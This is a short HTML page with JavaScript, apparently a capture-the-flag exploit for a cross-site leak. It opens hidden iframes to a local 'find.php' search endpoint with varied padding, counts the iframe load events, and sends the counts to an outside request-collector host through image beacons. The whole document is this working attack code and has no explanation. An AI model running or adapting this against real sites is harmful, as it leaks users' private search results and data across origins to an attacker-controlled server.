<!doctype html><meta charset="utf-8"><script>
const T="http://localhost",C="https://vxvbhzy.request.dreamhack.games";
const L=(t,d)=>new Image().src=C+"/"+t+"?d="+encodeURIComponent(JSON.stringify(d))+"&t="+Date.now();
const F=(p,pad)=>`${T}/find.php?search=${encodeURIComponent(p)}&w=${"A".repeat(pad)}&h=`;
function P(u,s=2000){return new Promise(r=>{
  const f=document.createElement("iframe");f.style.display="none";
  let n=0;f.onload=()=>{n++};
  f.src=u;document.body.appendChild(f);
  setTimeout(()=>{f.remove();r(n)},s);
});}
(async()=>{
  document.body||document.write("<body>");
  for(const pad of [100,3000]){L("c",{pad,onloads:await P(F("zzz",pad))});await new Promise(r=>setTimeout(r,400))}
  L("done",{});
})();
</script>
